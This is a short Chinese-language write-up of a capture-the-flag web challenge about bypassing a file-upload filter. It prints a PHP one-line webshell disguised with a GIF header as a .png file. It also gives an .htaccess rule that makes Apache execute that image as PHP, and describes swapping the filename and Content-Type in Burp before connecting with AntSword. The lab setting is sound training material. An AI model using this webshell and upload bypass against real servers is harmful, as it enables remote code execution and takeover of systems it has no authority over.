# [MRCTF2020]你传你🐎呢

>题目：BUUCTF Web

__0x00 审题__

要传入一个文件，应该跟一句话木马相关，根据经验直接上传后缀名为jpg/png的文件

__0x01 解题__

建立文件a.png

```
GIF89a? 
<script language="php">eval($_POST['cmd']);</script>
```

直接上传，成功后用BurpSuit抓包，然后优先考虑直接改后缀名.png为.php，发现惨遭过滤，类似的phtml,php5也都被过滤了

* 新的方法 .htaccess

> 是什么：在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
> 如何应用：[ ](https://httpd.apache.org/docs/2.4/howto/htaccess.html)
> 工作原理： .htaccess文件(或者"分布式配置文件")提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。

建立一个文本存放：
```
<FilesMatch "a.png">
SetHandler application/x-httpd-php
</FilesMatch>
```
我通过.png的格式传入，通过Bp抓包后修改后缀名为.htaccess

发现可以成功

> 如果没有过滤.htaccess可以考虑先上传他再更改,Content-Type中更改类型为image/png

* 注：

蚁剑连接的路径：去除www/html/之后的完整路径。




